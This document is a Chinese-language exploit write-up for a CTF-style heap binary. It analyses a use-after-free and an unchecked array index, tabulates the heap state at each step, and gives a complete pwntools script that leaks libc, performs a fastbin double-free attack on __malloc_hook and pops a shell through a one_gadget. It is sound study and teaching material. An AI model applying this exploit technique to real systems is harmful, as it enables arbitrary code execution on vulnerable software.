# 漏洞利用文档

## 执行环境
基于提供的exp脚本和调试信息，分析程序的运行环境如下：
- **二进制类型**：64位ELF可执行文件，使用动态链接的glibc库（通过`ldd`推断）。
- **安全保护**：
  - PIE（Position-Independent Executable）启用：全局数组地址`0x5b5d3e602060`显示基址随机化。
  - 无栈保护（Canary）迹象：堆漏洞利用未涉及栈操作。
  - NX（No-Execute）可能启用：利用通过覆盖hook函数而非shellcode执行。
  - 部分RELRO：全局数组可写，允许修改指针。
- **依赖需求**：运行需Linux环境，exp依赖`pwn`库（如pwntools），libc版本与目标匹配（调试中为libc-2.23）。
- **运行方式**：通过`process('./data/sample13')`启动，需确保二进制文件路径正确。

## 漏洞成因
### 关键结构体分析
程序使用全局数组`unk_202060`（类型为`girl_info*[100]`）存储女孩信息指针。每个结构体定义如下（基于内存布局推断）：
```c
struct girl_info {
    char *name;       // 动态分配的名字字符串指针（偏移0）
    int name_size;    // 名字字符串大小（偏移8）
    char call[12];    // 固定呼叫字符串（偏移12）
};
```
全局变量`dword_20204C`记录当前女孩数量。

### 漏洞分析
1. **Use-After-Free (UAF) 漏洞**：
   - **位置**：函数`sub_DD6()`（菜单选项4，呼叫功能）中执行`free(**((void ***)&unk_202060 + v2))`释放name指针，但未将结构体中的指针置空。
   - **成因**：释放后，全局数组仍保留该指针。后续在`sub_CFC()`（菜单选项2，显示功能）中通过`puts(**((const char ***)&unk_202060 + v1))`使用已释放指针，导致UAF。攻击者可控制释放内存内容，实现信息泄漏或代码执行。
   - **动态调试验证**：Step 2中，调用`call(0)`后，第一个女孩的name指针指向已释放内存（`0x7a858befbb78`，main_arena+88），但通过`show(0)`仍可读取该地址，泄漏libc基址。

2. **数组越界读漏洞**：
   - **位置**：函数`sub_CFC()`（菜单选项2）中，用户索引`v1`通过`__isoc99_scanf("%d", &v1)`读取，未检查是否在[0, 99]范围内。
   - **成因**：直接使用`v1`访问全局数组，若索引越界（负数或≥100），可读任意内存地址，导致信息泄漏或崩溃。exp中未直接利用此漏洞，但增加了攻击面。

## 漏洞利用过程
利用过程通过exp脚本步进执行，关键内存变化如下表所示（基于调试记录总结）：

| 步骤 | exp操作 | 关键内存变化 | 利用阶段 |
|------|----------|---------------|----------|
| 1 | `add(0x80); add(0x60); add(0x60)` | 分配3个女孩结构体，堆布局正常：<br>• 全局数组包含3个指针<br>• 所有name指针指向有效字符串"a"<br>• bins为空 | 初始堆布局准备 |
| 2 | `call(0)` | 触发UAF：<br>• 第一个女孩name指针释放，指向unsorted bin（`0x7a858befbb78`）<br>• call字符串被破坏<br>• unsorted bin包含一个chunk | UAF触发与信息泄漏准备 |
| 3 | `show(0)` | 泄漏libc地址：<br>• 读取已释放name指针，获取main_arena+88地址<br>• 计算libc基址：`0x7a858bb37000` | 信息泄漏成功 |
| 4 | `call(1); call(2); call(1)` | 触发double-free：<br>• 创建fastbin循环链表（`0x5b5d43dd90d0 → 0x5b5d43dd9160`）<br>• 多个女孩结构体call字符串被破坏<br>• fastbins(0x70)包含循环链表 | Double-free漏洞利用 |
| 5 | `add(0x60, p64(libc.sym["__malloc_hook"]-0x23))` | Fastbin attack重定向链：<br>• fastbin链指向libc（`0x7a858befbaed`）<br>• 全局数组扩展到6个指针<br>• 多个name指针指向libc区域 | 链重定向至__malloc_hook附近 |
| 6 | `add(0x60, payload)` | 写入payload：<br>• 在`__malloc_hook-0x23`处写入one_gadget和realloc地址<br>• payload：`b'a'*11 + p64(one_gadget) + p64(realloc+2)`<br>• __malloc_hook未直接覆盖，但链已准备 | Payload部署 |
| 7 | `sendlineafter("Input your choice:", "1")` | 触发最终malloc：<br>• __malloc_hook执行，跳转至one_gadget<br>• 控制流劫持，启动/bin/dash shell<br>• 内存映射切换至shell空间 | 代码执行触发 |
| 8 | `p.interactive()` | 获得交互式shell：<br>• 程序完全被shell替代<br>• 可执行任意命令 | 利用完成 |

### 内存变化关键点：
- **堆布局演变**：从初始正常分配→UAF释放→double-free循环→fastbin重定向→payload覆盖→shell执行。
- **bins状态**：初始空→unsorted bin包含chunk→fastbin循环链表→链指向libc→最终破坏。
- **全局数组**：指针数量从3增至7，部分指针指向libc区域，验证数组越界读潜在风险。

## Exploit
以下是完整的漏洞利用脚本，基于提供的exp添加详细注释：

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'  # 启用调试输出
context.terminal = ['tmux', 'splitw', '-h']  # 用于调试的终端设置
p = process('./data/sample13')  # 启动目标程序
elf = ELF('./data/sample13')   # 加载ELF文件信息
libc = elf.libc  # 获取程序使用的libc

def add(size, name="a", phone="b"):
    """添加女孩信息：分配指定大小的name内存，并设置call字符串"""
    p.sendlineafter("Input your choice:", "1")  # 选择添加功能
    p.sendlineafter("Please input the size of girl's name\n", str(size))  # 输入name大小
    p.sendafter("please inpute her name:\n", name)  # 输入name内容
    p.sendafter("please input her call:\n", phone)  # 输入call字符串

def show(idx):
    """显示女孩信息：利用UAF或越界读泄漏内存"""
    p.sendlineafter("Input your choice:", "2")  # 选择显示功能
    p.sendlineafter("Please input the index:\n", str(idx))  # 输入索引（可能越界）
    p.recvuntil("name:\n")
    name = p.recvline()  # 读取name内容（可能为泄漏数据）
    p.recvuntil("phone:\n")
    phone = p.recvline()
    info("recv name:{}  phone:{}".format(name, phone))  # 打印泄漏信息
    return name, phone

def call(idx):
    """呼叫女孩：释放name内存，触发UAF"""
    p.sendlineafter("Input your choice:", "4")  # 选择呼叫功能
    p.sendlineafter("Please input the index:\n", str(idx))  # 输入索引

# 漏洞利用步骤
add(0x80); add(0x60); add(0x60)  # Step 1: 初始堆布局，分配不同大小chunk为后续利用准备

call(0)  # Step 2: 释放第一个女孩的name内存，触发UAF，chunk进入unsorted bin

name, _ = show(0)  # Step 3: 使用UAF读取已释放内存，泄漏libc地址
leak_libc_addr = u64(name[:-1].ljust(8, b"\x00"))  # 解析泄漏的地址（main_arena+88）
libc_base_addr = leak_libc_addr - (libc.sym['__malloc_hook'] + 0x10 + 0x58)  # 计算libc基址
libc.address = libc_base_addr  # 设置libc基址用于后续偏移计算
info("Leaked libc base: {}".format(hex(libc_base_addr)))  # 打印泄漏的基址

call(1); call(2); call(1)  # Step 4: 触发double-free，创建fastbin循环链表（0x70大小）

# Step 5: Fastbin attack—通过分配控制fastbin链指向__malloc_hook附近
add(0x60, p64(libc.sym["__malloc_hook"] - 0x23))  # 写入目标地址到fastbin链
add(0x60)  # 消耗一个chunk，调整链
add(0x60)  # 进一步调整链

# Step 6: 部署payload到__malloc_hook区域
one_gadget = libc.address + 0xf1247  # 计算one_gadget地址（基于泄漏的libc）
# 构造payload：填充11字节对齐，然后写入one_gadget和realloc+2地址（用于栈调整）
payload = b'a' * 11 + p64(one_gadget) + p64(libc.sym['realloc'] + 2)
add(0x60, payload)  # 分配chunk并写入payload，覆盖__malloc_hook附近内存

p.sendlineafter("Input your choice:", "1")  # Step 7: 触发malloc执行，劫持控制流到one_gadget
p.interactive()  # Step 8: 进入交互模式，获得shell控制
```

### 注释说明：
- **关键函数**：`add`、`show`、`call` 封装了程序功能，利用UAF和double-free。
- **信息泄漏**：Step 3通过UAF读取unsorted bin的fd指针，泄漏libc地址。
- **堆利用**：Step 4-6使用double-free和fastbin attack将链重定向至`__malloc_hook`，并写入one_gadget。
- **执行触发**：Step 7通过再次`add`触发malloc，执行one_gadget获得shell。
- **可靠性**：exp依赖特定libc版本（one_gadget偏移需匹配），在实际环境中需调整。
